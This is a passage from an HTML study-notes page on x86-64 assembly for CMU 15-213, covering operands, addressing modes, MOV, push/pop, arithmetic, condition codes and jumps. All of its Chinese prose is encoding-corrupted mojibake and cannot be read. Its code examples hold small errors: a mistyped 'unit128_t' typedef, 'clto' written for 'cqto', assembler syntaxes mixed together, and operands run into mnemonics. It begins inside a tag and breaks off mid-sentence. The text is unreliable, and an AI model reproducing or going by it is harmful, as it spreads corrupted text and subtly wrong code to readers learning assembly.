title="åŸºæœ¬æ“ä½œæ•°"></a>åŸºæœ¬æ“ä½œæ•°</h3><p>å„ç§æ“ä½œæ•°å¯ä»¥åˆ†ä¸ºä¸‰ç§ç±»å‹ï¼š</p><ol><li><p>ç«‹å³æ•°ï¼Œç”¨äºè¡¨ç¤ºå¸¸æ•°å€¼ï¼Œä¹¦å†™æ–¹å¼ä¸ºâ€$â€åè·Ÿä¸€ä¸ªç”¨Cè¡¨ç¤ºæ³•è¡¨ç¤ºçš„æ•´æ•°ã€‚</p></li><li><p>å¯„å­˜å™¨ï¼Œè¡¨ç¤ºæŸä¸ªå¯„å­˜å™¨çš„å†…å®¹ï¼Œ16ä¸ªå¯„å­˜å™¨çš„ä½ä½1ã€2ã€4ã€8å­—èŠ‚ä¸­çš„ä¸€ä¸ªä½œä¸ºæ“ä½œæ•°ï¼Œå¯¹åº”8ã€16ã€32ã€64ä½ã€‚æˆ‘ä»¬ç”¨$r_a$è¡¨ç¤ºå¯„å­˜å™¨aï¼Œç”¨$R[r_a]$æ¥è¡¨ç¤ºå®ƒçš„å€¼ã€‚è¿™è¡¨ç¤ºå°†å¯„å­˜å™¨é›†åˆçœ‹æˆä¸€ä¸ªæ•°ç»„ã€‚</p><p><strong>å¯„å­˜å™¨æœ‰ä¸€ä¸ªç‰¹ç‚¹ï¼šä»»ä½•ä¸ºå¯„å­˜å™¨ç”Ÿæˆ32ä½å€¼çš„æŒ‡ä»¤éƒ½ä¼šæŠŠè¯¥å¯„å­˜å™¨çš„é«˜ä½éƒ¨åˆ†ç½®ä¸º0.</strong></p></li><li><p>å†…å­˜å¼•ç”¨ï¼Œæ ¹æ®æ®è®¡ç®—å‡ºæ¥çš„æœ‰æ•ˆåœ°å€è®¿é—®æŸä¸ªå†…å­˜ä½ç½®ã€‚å› ä¸ºå°†å†…å­˜çœ‹æˆä¸€ä¸ªå¾ˆæ‰“åŠ¨å­—èŠ‚æ•°ç»„ï¼Œæˆ‘ä»¬ç”¨ç¬¦å·$M_b[Addr]$è¡¨è¿°å¯¹å­˜å‚¨åœ¨å†…å­˜ä¸­ä»åœ°å€Addrå¼€å§‹çš„bä¸ªå­—èŠ‚çš„å¼•ç”¨ã€‚</p><p>ä¸€ç§æœ€å¸¸è§çš„å¯»å€æ¨¡å¼ï¼š$Imm(r_b,r_i,s)$ï¼ŒåŒ…æ‹¬å››ä¸ªç»„æˆéƒ¨åˆ†ï¼Œä¸€ä¸ªç«‹å³æ•°åç§»$Imm$,ä¸€ä¸ªåŸºå€å¯„å­˜å™¨$r_b$ï¼Œä¸€ä¸ªå˜å€å¯„å­˜å™¨$r_i$ï¼Œä¸€ä¸ªæ¯”ä¾‹å› å­$s&#x3D;1ï¼Œ2ï¼Œ4ï¼Œ8$ï¼Œæœ‰æ•ˆåœ°å€çš„è®¡ç®—ä¸º$Imm+R[r_b]+R[r_i]\cdot s$</p></li></ol><p><img src="/Pictures/CMU15-213/addrSearch.png" alt="addrSearch"></p><h3 id="æ•°æ®å¤åˆ¶"><a href="#æ•°æ®å¤åˆ¶" class="headerlink" title="æ•°æ®å¤åˆ¶"></a>æ•°æ®å¤åˆ¶</h3><p>æ•°æ®ä¼ é€æŒ‡ä»¤â€”â€”MOVç±»ã€‚è¿™äº›æŒ‡ä»¤æŠŠæ•°æ®ä»æºä½ç½®å¤åˆ¶åˆ°ç›®çš„ä½ç½®ï¼Œä¸åšä»»ä½•å˜åŒ–ã€‚</p><p>MOVç±»æŒ‡ä»¤ç”±å››æ¡æŒ‡ä»¤ç»„æˆï¼šmovb,movw,movl,movqã€‚è¿™äº›æŒ‡ä»¤æ“ä½œçš„æ•°æ®å¤§å°åˆ†åˆ«ä¸º1ã€2ã€4ã€8å­—èŠ‚ã€‚æºæ“ä½œæ•°æŒ‡å®šçš„å€¼æ˜¯ä¸€ä¸ªç«‹å³æ•°ï¼Œå‚¨å­˜åœ¨å¯„å­˜å™¨ä¸­æˆ–è€…å†…å­˜ä¸­ã€‚ç›®çš„æ“ä½œæ•°æŒ‡å®šä¸€ä¸ªä½ç½®ï¼Œè¦ä¹ˆæ˜¯ä¸€ä¸ªå¯„å­˜å™¨æˆ–è€…æ˜¯ä¸€ä¸ªå†…å­˜åœ°å€ã€‚</p><p>æºå’Œç›®çš„çš„ç»„åˆæœ‰äº”ç§ï¼šI2Rï¼ŒI2Mï¼ŒR2Rï¼ŒR2Mï¼ŒM2Rã€‚</p><blockquote><p>Iâ€“Imm    Râ€“register    Mâ€“Memory</p></blockquote><p>å¸¸è§„çš„<code>movq</code>æŒ‡ä»¤åªèƒ½ä»¥è¡¨ç¤ºä¸º32ä½è¡¥ç æ•°å­—çš„ç«‹å³æ•°ä½œä¸ºæºæ“ä½œæ•°ï¼Œç„¶åæŠŠè¿™ä¸ªå€¼ç¬¦å·æ‹“å±•å¾—åˆ°64ä½çš„å€¼ï¼Œæ”¾åˆ°ç›®çš„ä½ç½®ã€‚è€Œ<code>movabsq</code>æŒ‡ä»¤èƒ½å¤Ÿä»¥ä»»æ„64ä½ç«‹å³æ•°å€¼ä½æºæ“ä½œæ•°ï¼Œå¹¶ä¸”åªèƒ½ä»¥<strong>å¯„å­˜å™¨</strong>ä½œä¸ºç›®çš„ã€‚</p><p>åŸºäºMOVç±»è¡ç”Ÿå‡ºMOVZç±»å’ŒMOVSç±»æŒ‡ä»¤ï¼Œç”¨äºå°†è¾ƒå°çš„æºå€¼å¤åˆ¶åˆ°è¾ƒå¤§çš„ç›®çš„æ—¶ä½¿ç”¨ã€‚æ‰€æœ‰è¿™äº›æŒ‡ä»¤çš„<strong>ç›®çš„éƒ½ä¸ºå¯„å­˜å™¨</strong>ã€‚MOVZä½¿ç”¨é›¶æ‰©å±•ï¼Œè€ŒMOVSä½¿ç”¨ç¬¦å·æ‰©å±•ã€‚MOVSç±»ä¸­çš„cltqåªç”¨äºå°†%eaxç¬¦å·æ‰©å±•åˆ°%raxï¼Œæ•ˆæœä¸movslq %eaxï¼Œ%raxå®Œå…¨ä¸€è‡´ï¼Œä¸è¿‡ç¼–ç æ›´ç´§å‡‘ã€‚</p><p><strong>å…³äºç›´æ¥å¯»å€å’Œé—´æ¥å¯»å€</strong>ï¼šåœ¨å­¦ä¹ æ—¶ï¼Œç¬”è€…å¯¹ç›´æ¥å¯»å€å’Œé—´æ¥å¯»å€çš„æ¦‚å¿µæ¯”è¾ƒæ¨¡ç³Šï¼Œåœ¨è¿™é‡Œå¯¹äºè¿™ä¸¤ä¸ªæ¦‚å¿µè¿›è¡Œæ€»ç»“ï¼Œä»¥ä¸€ä¸ªä¾‹å­å…¥æ‰‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .data<br>    value: dq 10          ; å®šä¹‰ä¸€ä¸ªæ•°æ®æ®µå˜é‡ï¼Œåˆå§‹å€¼ä¸º 10<br><br>section .text<br>    global _start<br><br>_start:<br>    mov value, %rbx       ; å°†å˜é‡ value çš„åœ°å€ç§»åŠ¨åˆ° rbx å¯„å­˜å™¨ä¸­<br>    mov (%rbx), %rcx      ; å°† rbx å¯„å­˜å™¨æŒ‡å‘çš„å†…å­˜åœ°å€å¤„çš„å€¼ï¼ˆ10ï¼‰ç§»åŠ¨åˆ° rcx å¯„å­˜å™¨ä¸­<br>    add $2, %rcx          ; å°†ç«‹å³æ•° 2 åŠ åˆ° rcx å¯„å­˜å™¨çš„å½“å‰å€¼ä¸Šï¼ˆç°åœ¨ rcx ä¸­çš„å€¼æ˜¯ 12ï¼‰<br>    mov %rcx, (%rbx)      ; å°† rcx å¯„å­˜å™¨ä¸­çš„å€¼ï¼ˆ12ï¼‰ç§»åŠ¨å› rbx æŒ‡å‘çš„å†…å­˜åœ°å€å¤„ï¼ˆæ›´æ–° value çš„å€¼ä¸º 12ï¼‰<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸¤ä¸ªå…³é”®æ˜“æ··æ·†çš„ç‚¹è¦æ³¨æ„ï¼š</p><ol><li>åœ¨æŒ‡ä»¤ä¸­ï¼Œ<code>value</code>å¹¶ä¸æ˜¯ä¸€ä¸ªç«‹å³æ•°ï¼Œè€Œæ˜¯çœ‹åšå†…å­˜ä¸­çš„ä¸€ä¸ªåœ°å€ï¼ˆå‡è®¾ä¸º0x1000ï¼‰ï¼Œåœ¨å†…å­˜0x1000è¿™ä¸ªåœ°å€å‚¨å­˜äº†æ•´æ•°10ã€‚å› æ­¤ï¼Œç¬¬ä¸€æ­¥æ“ä½œ<code>mov value, %rbx</code>ä»£è¡¨å°†åœ°å€<code>0x1000</code>å­˜å…¥<code>rbx</code>å¯„å­˜å™¨ä¸­è€Œä¸æ˜¯å°†æ•°å€¼<code>10</code>å­˜å…¥<code>rbx</code>ã€‚</li><li>ç¬¬äºŒæ­¥å¾ˆå¥½åœ°è¯´æ˜äº†é—´æ¥å–å€å’Œç›´æ¥å–å€ä¹‹é—´çš„åŒºåˆ«ï¼š<code>(%rbx)</code>ä»£è¡¨çš„æ˜¯å†…å­˜ä¸­çš„ä¸€ä¸ªåœ°å€ï¼Œå…·ä½“ä¸º<code>rbx</code>å†…å‚¨å­˜çš„åœ°å€<code>0x1000</code>ã€‚è€Œ<code>%rcx</code>ä»£è¡¨å¯„å­˜å™¨ä¸­çš„<code>rcx</code>ã€‚è¿™æ­¥æ“ä½œå°† <code>rbx</code> å¯„å­˜å™¨æŒ‡å‘çš„å†…å­˜åœ°å€ <code>0x1000</code> å¤„çš„å€¼ï¼ˆå³ <code>value</code> çš„å€¼ï¼Œè¿™é‡Œæ˜¯ 10ï¼‰ç§»åŠ¨åˆ° <code>rcx</code> å¯„å­˜å™¨ä¸­ã€‚è¿™é‡Œå¯ä»¥æŠŠå†…å­˜å’Œå¯„å­˜å™¨çœ‹ä¸ºä¸¤ä¸ªä¸åŒçš„æ•°ç»„Må’ŒRï¼Œ<code>rbx</code>å­˜æ”¾çš„æ˜¯<code>0x1000=R[r_b]</code>ï¼Œ<code>rcx</code>å­˜æ”¾çš„æ˜¯æ•°<code>10=R[r_c]</code>,<code>(%rbx)=M[R[r_b]]=M[0x1000]</code>å­˜æ”¾çš„æ˜¯valueçš„å€¼ã€‚</li></ol><h3 id="å‹æ ˆ-å¼¹æ ˆ"><a href="#å‹æ ˆ-å¼¹æ ˆ" class="headerlink" title="å‹æ ˆ&#x2F;å¼¹æ ˆ"></a>å‹æ ˆ&#x2F;å¼¹æ ˆ</h3><p>æ ˆæ˜¯æ»¡è¶³å…ˆå…¥åå‡ºçš„é¡ºåºç»“æ„ï¼Œä¸€èˆ¬ç”¨pushä»£è¡¨å‹æ ˆï¼Œpopä»£è¡¨å‡ºæ ˆã€‚æ ˆæŒ‡é’ˆ<code>%rsp</code>ä¿å­˜ç€æ ˆé¡¶å…ƒç´ çš„åœ°å€ã€‚</p><table><thead><tr><th>æŒ‡ä»¤</th><th>æ•ˆæœ</th><th>æè¿°</th></tr></thead><tbody><tr><td>pushq    S</td><td>R[%rsp]-8 $\to$ R[%rsp];S $\to$ M[R[%rsp]]</td><td>å°†å››å­—å‹å…¥æ ˆ</td></tr><tr><td>popq    D</td><td>M[R[%rsp]] $\to$ D;R[%rsp]+8 $\to$ R[%rsp]</td><td>å°†å››å­—å¼¹å‡ºæ ˆ</td></tr></tbody></table><p>æŒ‡ä»¤ <code>pushq %rbp</code>çš„è¡Œä¸ºç­‰ä»·äºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">subq  $8,%rsp<br>movq  %rbp,(%rsp)<br></code></pre></td></tr></table></figure><p>åŒç†ï¼ŒæŒ‡ä»¤<code>popq  %rax</code>ç­‰ä»·äºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq  (%rsp),%rax<br>addq  $8,%rsp<br></code></pre></td></tr></table></figure><h3 id="ç®—æœ¯å’Œé€»è¾‘æ“ä½œ"><a href="#ç®—æœ¯å’Œé€»è¾‘æ“ä½œ" class="headerlink" title="ç®—æœ¯å’Œé€»è¾‘æ“ä½œ"></a>ç®—æœ¯å’Œé€»è¾‘æ“ä½œ</h3><p>æ“ä½œè¢«åˆ†ä¸ºå››ç±»ï¼šåŠ è½½æœ‰æ•ˆåœ°å€ï¼Œä¸€å…ƒæ“ä½œï¼ŒäºŒå…ƒæ“ä½œå’Œç§»ä½ã€‚</p><p><img src="/Pictures/CMU15-213/ops.png" alt="ops"></p><ol><li><p>åŠ è½½æœ‰æ•ˆåœ°å€ï¼ˆload effective addressï¼‰æŒ‡ä»¤å®é™…ä¸Šæ˜¯<code>movq</code>æŒ‡ä»¤çš„å˜å½¢ã€‚åœ¨å½¢å¼ä¸Šæ˜¯ä»å†…å­˜è¯»å–æ•°æ®åˆ°å¯„å­˜å™¨ï¼Œä½†å®é™…ä¸Šæ ¹æœ¬æ²¡æœ‰å¼•ç”¨å†…å­˜ã€‚ç¬¬ä¸€ä¸ªæ“ä½œæ•°çœ‹ä¸Šå»æ˜¯ä¸€ä¸ªå†…å­˜å¼•ç”¨ï¼Œä½†å®é™…ä¸Šæ˜¯å°†æœ‰æ•ˆåœ°å€å†™å…¥åˆ°ç›®çš„æ“ä½œæ•°ã€‚</p><p>ä¾‹å¦‚ï¼š<code>leaq 7(%rdx, %rdx, 4), %rax</code>ã€‚æˆ‘ä»¬å‡è®¾rdxçš„å€¼ä¸º$x$ï¼Œé‚£ä¹ˆraxçš„å€¼ä¸º$5x+7$.</p><p>æ‰€ä»¥ï¼Œåˆ©ç”¨è¿™æ¡æŒ‡ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°ç®€å•çš„ç®—æœ¯è¿ç®—ã€‚</p></li><li><p>ä¸€å…ƒæ“ä½œï¼šå…·ä½“æ¶‰åŠåˆ°å››ç§æ“ä½œï¼Œåˆ†åˆ«æ˜¯åŠ ä¸€ã€å‡ä¸€ã€å–è´Ÿã€å–è¡¥</p></li><li><p>äºŒå…ƒæ“ä½œï¼šå‰é¢çš„æ“ä½œæ•°ç§°ä¸ºæºSï¼Œç¬¬äºŒä¸ªæ“ä½œæ•°ç§°ä¸ºç›®çš„Dï¼Œç»“æœè¢«å­˜å‚¨åœ¨ç›®çš„Dé‡Œé¢ã€‚</p></li><li><p>ç§»ä½æ“ä½œï¼šæ³¨æ„é€»è¾‘å³ç§»å’Œç®—æ•°å³ç§»çš„åŒºåˆ«ï¼Œé€»è¾‘å·¦ç§»å’Œç®—æœ¯å·¦ç§»æ²¡æœ‰åŒºåˆ«ã€‚</p></li></ol><p>é™¤å¼€ä¸Šé¢è®¨è®ºçš„å‡ ç§æ“ä½œä¹‹å¤–ï¼Œè¿˜æœ‰å‡ ç±»ç‰¹æ®Šçš„ç®—æœ¯æ“ä½œã€‚ä¸¤ä¸ª64ä¸ºæœ‰ç¬¦å·æ•°æˆ–æ— ç¬¦å·æ•°ç›¸ä¹˜éœ€è¦128ä½æ¥è¡¨ç¤ºã€‚åœ¨x86-64æŒ‡ä»¤é›†ä¸­ï¼Œå¯¹128ä½ï¼ˆ16bytesï¼‰çš„æ“ä½œæä¾›ä¸€äº›æœ‰é™çš„æ”¯æŒã€‚è¿™äº›ç‰¹æ®Šæ“ä½œå°±æ˜¯å¯¹16å­—è¿›è¡Œæ“ä½œã€‚</p><table><thead><tr><th>æŒ‡ä»¤</th><th>æ•ˆæœ</th><th>æè¿°</th></tr></thead><tbody><tr><td>imulq&#x2F;mulq    S</td><td>R[%rdx];S*R[%rax] â€“&gt; R[%rax]</td><td>æœ‰ç¬¦å·&#x2F;æ— ç¬¦å·å…¨ä¹˜æ³•</td></tr><tr><td>clto    S</td><td></td><td>è½¬æ¢ä¸º8å­—</td></tr><tr><td>idivq&#x2F;divq    S</td><td></td><td>æœ‰ç¬¦å·&#x2F;æ— ç¬¦å·é™¤æ³•</td></tr></tbody></table><p>åœ¨æ‰§è¡Œä¸¤ä¸ª64ä½æ•°çš„128ä½ä¹˜ç§¯æ˜¯ï¼Œè¦æ±‚ä¸€ä¸ªå‚æ•°å¿…é¡»åœ¨å¯„å­˜å™¨%raxä¸­ï¼Œå¦ä¸€ä¸ªä½œä¸ºæŒ‡ä»¤çš„æºæ“ä½œæ•°ç»™å‡ºï¼Œç„¶åå°†ä¹˜ç§¯å­˜æ”¾åœ¨%rdxï¼ˆé«˜64ä½ï¼‰å’Œ%raxï¼ˆä½64ä½ï¼‰ä¸­ã€‚</p><p>ä¸‹é¢ä»Cè¯­è¨€å’Œæ±‡ç¼–ä»£ç çš„è§’åº¦è¿›ä¸€æ­¥å‰–æè¿™æ¡æŒ‡ä»¤ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> __int128 <span class="hljs-type">unit128_t</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">store_uprod</span><span class="hljs-params">(<span class="hljs-type">uint128_t</span> *dest, <span class="hljs-type">uint64_t</span> x, <span class="hljs-type">uint64_t</span> y)</span> &#123;<br>    *dest = x * (<span class="hljs-type">uint128_t</span>)y;<br>&#125;<br></code></pre></td></tr></table></figure><p>gccç”Ÿæˆçš„æ±‡ç¼–ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;dest in %rdi, x in %rsi, y in %rdx<br>store_uprod:<br>movq%rsi,%rax    ;Copy x to multiplicand<br>mulq%rdx         ;Multiply by y<br>movq%rax,(%rdi)  ;Store lower 8 bytes at dest<br>movq%rdx,8(%rdi) ;Store upper 8 bytes at dest+8<br>ret<br></code></pre></td></tr></table></figure><p>å¯¹äºå¤§å¤šæ•°64ä½é™¤æ³•åº”ç”¨æ¥è¯´ï¼Œé™¤æ•°ä¹Ÿå¸¸å¸¸æ˜¯ä¸€ä¸ª64ä½çš„å€¼ï¼Œè¿™ä¸ªå€¼åº”è¯¥å­˜æ”¾åœ¨%raxä¸­ï¼Œ%rdxçš„ä½åº”è¯¥å…¨è®¾ç½®ä¸º0æˆ–è€…ç¬¦å·ä½ã€‚åé¢è¿™ä¸ªæ“ä½œå¯ä»¥ç”¨æŒ‡ä»¤<code>cqto</code>æ¥å®Œæˆï¼Œå®ƒä¸éœ€è¦æ“ä½œæ•°ï¼Œä¼šéšå«è¯»å‡º%raxçš„ç¬¦å·ä½å¹¶å¤åˆ¶åˆ°%rdxçš„æ‰€æœ‰ä½ã€‚</p><p>ä»Cè¯­è¨€å’Œæ±‡ç¼–ä»£ç çš„è§’åº¦è¿›è¡Œè¿›ä¸€æ­¥è§£æï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">remdiv</span><span class="hljs-params">(<span class="hljs-type">long</span> x, <span class="hljs-type">long</span> y, <span class="hljs-type">long</span> *qp, <span class="hljs-type">long</span> *rp)</span> &#123;<br>    <span class="hljs-type">long</span> q = x/y;<br>    <span class="hljs-type">long</span> r = x%y;<br>    *qp = q;<br>    *rp = r;<br>&#125;<br></code></pre></td></tr></table></figure><p>gccç”Ÿæˆçš„æ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;x in %rdi, y in %rsi, qp in %rdx, rp in %rcx<br>remdiv:<br>movq%rdx,%r8;Copy qp<br>movq%rdi,%rax;move x to lower 8 bytes of dividend<br>cqto;Sign extend to upper 8 bytes<br>idivq%rsi;Divide by y<br>movq%rax,(%r8);Store quotient at qp<br>movq%rdx,(%rcx);Store remainder at rp<br>ret<br></code></pre></td></tr></table></figure><h3 id="æ¡ä»¶ç "><a href="#æ¡ä»¶ç " class="headerlink" title="æ¡ä»¶ç "></a>æ¡ä»¶ç </h3><p>é™¤äº†æ•´æ•°å¯„å­˜å™¨ï¼ŒCPUè¿˜ç»´æŠ¤äº†ä¸€ç»„å•ä¸ªä½çš„æ¡ä»¶ç å¯„å­˜å™¨ï¼Œæè¿°äº†æœ€è¿‘çš„ç®—æ•°æˆ–é€»è¾‘æ“ä½œçš„å±æ€§ï¼Œå¯ä»¥æ£€æµ‹è¿™äº›å¯„å­˜å™¨æ¥æ‰§è¡Œæ¡ä»¶åˆ†æ”¯æŒ‡ä»¤ã€‚æœ€å¸¸ç”¨çš„æ¡ä»¶ç åŒ…æ‹¬ï¼š</p><ul><li>CFï¼šè¿›ä½æ ‡å¿—ã€‚æœ€è¿‘çš„æ“ä½œæ•°æ˜¯æœ€é«˜ä½äº§ç”Ÿäº†è¿›ä½ï¼Œå¯ä»¥æ£€æµ‹æ— ç¬¦å·æ“ä½œçš„æº¢å‡ºã€‚</li><li>ZFï¼šé›¶æ ‡å¿—ã€‚æœ€è¿‘çš„æ“ä½œå¾—åˆ°çš„ç»“æœä¸º0.</li><li>SFï¼šç¬¦å·æ ‡å¿—ã€‚æœ€è¿‘çš„æ“ä½œå¾—åˆ°çš„ç»“æœä¸ºè´Ÿæ•°ã€‚</li><li>OFï¼šæº¢å‡ºæ ‡å¿—ã€‚æœ€è¿‘çš„æ“ä½œå¯¼è‡´ä¸€ä¸ªè¡¥ç æº¢å‡ºã€‚</li></ul><p>leaqæ“ä½œä¸æ”¹å˜ä»»ä½•æ¡ä»¶ç ï¼Œé™¤æ­¤ä¹‹å¤–å…¶ä½™æŒ‡ä»¤éƒ½æœ‰å¯èƒ½æ”¹å˜æ¡ä»¶ç ã€‚å¯¹äº<strong>é€»è¾‘æ“ä½œ</strong>ï¼Œè¿›ä½å’Œæº¢å‡ºæ ‡å¿—ä¼šè¢«è®¾ä¸º0.</p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€äº›æŒ‡ä»¤æ¥è®¾ç½®æ¡ä»¶ç ï¼š</p><p><img src="/Pictures/CMU15-213/Condition.png" alt="Condition code"></p><p>å…¶ä¸­ï¼ŒCMPæŒ‡ä»¤æ ¹æ®ä¸¤ä¸ªæ“ä½œæ•°ä¹‹å·®æ¥è®¾ç½®æ¡ä»¶ç ï¼ŒTESTæ ¹æ®ä¸¤ä¸ªæ“ä½œæ•°çš„ANDè¿ç®—ã€‚å…¸å‹ç”¨æ³•æ˜¯å°†ä¸¤ä¸ªæ“ä½œæ•°è®¾ç½®ä¸ºä¸€æ ·çš„æ¥æ£€æµ‹æ­£è´Ÿï¼Œæˆ–è€…å°†ä¸€ä¸ªè®¾ç½®ä¸ºæ©ç æ¥æµ‹è¯•ç‰¹å®šä½ã€‚</p><p>æ¡ä»¶ç ä¸€èˆ¬æœ‰ä¸‰ç§ä½¿ç”¨æ–¹å¼ï¼š</p><ol><li>æ ¹æ®æ¡ä»¶ç çš„æŸäº›ç»„åˆï¼Œå°†ä¸€ä¸ªå­—èŠ‚è®¾ç½®ä¸º0æˆ–è€…1</li><li>æ¡ä»¶è·³è½¬åˆ°ç¨‹åºçš„æŸä¸ªéƒ¨åˆ†</li><li>æœ‰æ¡ä»¶åœ°ä¼ è¾“æ•°æ®</li></ol><p>å®ç°æ¡ä»¶ç è®¾ç½®å­—èŠ‚æˆ‘ä»¬ä½¿ç”¨SETæŒ‡ä»¤ï¼Œåœ¨æŒ‡ä»¤ä¸­ï¼Œ<strong>â€œè®¾ç½®â€</strong>ä»£è¡¨èµ‹å€¼ä¸º1ã€‚</p><p><img src="/Pictures/CMU15-213/Set.png" alt="Set"></p><p>åˆ†æå„å‡½æ•°çš„æ•ˆæœï¼Œæˆ‘ä»¬å‘ç°æœ‰ç¬¦å·æ•°çš„æ¯”è¾ƒä¸»è¦æ¶‰åŠ<code>SF,OF,ZF</code>ï¼Œè€Œæ— ç¬¦å·æ•°çš„æ¯”è¾ƒæ¶‰åŠ<code>CF,ZF</code>ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œå®ç°æ¯”è¾ƒä¸¤ä¸ªæ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;a in %rdi, b in %rsi<br>comp:<br>cmpq%rsi,%rdi;Compare a:b<br>setl%al;Set low-order byte of %eax to 0 or 1<br>movzbl%al, %eax;Clear rest of %eax (and rest of %rax)<br>ret<br></code></pre></td></tr></table></figure><p>æ­¤å¤„ä¸»è¦æ³¨æ„movzblæŒ‡ä»¤ï¼ˆ1 to 4ï¼‰ï¼Œè¯¥æŒ‡ä»¤ä¸ä»…ä¼šæŠŠ%eaxçš„é«˜3ä¸ªå­—èŠ‚æ¸…é›¶ï¼Œè¿˜ä¼šæŠŠæ•´ä¸ªå¯„å­˜å™¨%raxçš„é«˜å››ä¸ªå­—èŠ‚éƒ½æ¸…é›¶ã€‚</p><p>æˆ‘ä»¬å‡è®¾æ­¤å¤„<code>a&lt;b</code>ï¼Œé‚£ä¹ˆ<code>cmpq</code>ä¼šå°†<code>SFã€CF</code>ç½®ä¸º1ï¼Œè€Œ<code>ZFã€OF</code>ä¸º0 ã€‚æ¥ä¸‹æ¥<code>setl</code>æŒ‡ä»¤ä¼šå°†<code>SF^OF</code>çš„å€¼èµ‹ç»™<code>D</code>ï¼Œå› æ­¤åœ¨è¿™é‡Œ<code>%al</code>å°†è¢«è®¾ç½®ä¸º1ï¼Œæœ€ç»ˆå‡½æ•°è¿”å›ç»“æœä¸º1.</p><h3 id="è·³è½¬æŒ‡ä»¤"><a href="#è·³è½¬æŒ‡ä»¤" class="headerlink" title="è·³è½¬æŒ‡ä»¤"></a>è·³è½¬æŒ‡ä»¤</h3><p>jumpæŒ‡ä»¤ä¼šå¯¼è‡´æ‰§è¡Œåˆ‡æ¢åˆ°ç¨‹åºä¸­ä¸€ä¸ªå…¨æ–°çš„ä½ç½®ã€‚åœ¨ç¨‹åºä¸­ï¼Œä¸€èˆ¬ä¼šæœ‰ä¸€ä¸ªLabelæ¥æŒ‡æ˜è·³è½¬çš„ä½ç½®ã€‚</p><p>è·³è½¬æŒ‡ä»¤å¯ä»¥æ˜¯<strong>ç›´æ¥è·³è½¬</strong>ï¼Œå³è·³è½¬ç›®æ ‡æ˜¯ä½œä¸ºæŒ‡ä»¤çš„ä¸€éƒ¨åˆ†æ¥ç¼–ç çš„ï¼›ä¹Ÿå¯ä»¥æ˜¯<strong>é—´æ¥è·³è½¬</strong>ï¼Œå³è·³è½¬ç›®æ ‡æ˜¯ä»å¯„å­˜å™¨æˆ–å†…å­˜ä½ç½®ä¸­è¯»å‡ºçš„ã€‚ç›´æ¥è·³è½¬ç›´æ¥ä½¿ç”¨ä¸€ä¸ªæ ‡å·ä½œä¸ºè·³è½¬ç›®æ ‡ï¼Œè€Œé—´æ¥è·³è½¬çš„å†™æ³•æ˜¯*<em>ï¼‹æ“ä½œæ•°æŒ‡ç¤ºç¬¦</em>ã€‚</p><p>ä¾‹å¦‚æŒ‡ä»¤<code>jmp *%rax</code>ç”¨å¯„å­˜å™¨%raxä¸­çš„å€¼ä½œä¸ºè·³è½¬ç›®æ ‡ï¼Œè€ŒæŒ‡ä»¤<code>jmp *(%rax)</code>ç”¨%raxä¸­çš„å€¼è¯»å‡ºåœ°å€ï¼Œä»å†…å­˜ä¸­è¯»å‡ºè·³è½¬ç›®æ ‡ã€‚</p><p><img src="/Pictures/CMU15-213/jump.png" alt="jump"></p><p>è·³è½¬æŒ‡ä»¤çš„ç¼–ç ï¼šåœ¨æ±‡ç¼–ä»£ç ä¸­ï¼Œè·³è½¬ç›®æ ‡ç”¨ç¬¦å·æ ‡å·ä¹¦å†™ã€‚è·³è½¬æŒ‡ä»¤æœ‰å‡ ç§ä¸åŒçš„ç¼–ç ï¼Œä½†å¸¸ç”¨çš„éƒ½æ˜¯PCç›¸å¯¹çš„ã€‚ä¹Ÿå°±æ˜¯ä¼šå°†ç›®æ ‡æŒ‡ä»¤çš„åœ°å€ç´§è·Ÿåœ¨è·³è½¬æŒ‡ä»¤åé¢çš„é‚£æ¡æŒ‡ä»¤çš„åœ°å€é—´çš„å·®å€¼ä½œä¸ºç¼–ç ï¼Œå¯ä»¥æ˜¯1ã€2ã€4å­—èŠ‚ã€‚ç¬¬äºŒç§æ–¹æ³•æ˜¯ç»å¯¹åœ°å€ç¼–ç ï¼Œç”¨å››ä¸ª å­—èŠ‚ç›´æ¥æŒ‡å®šç›®æ 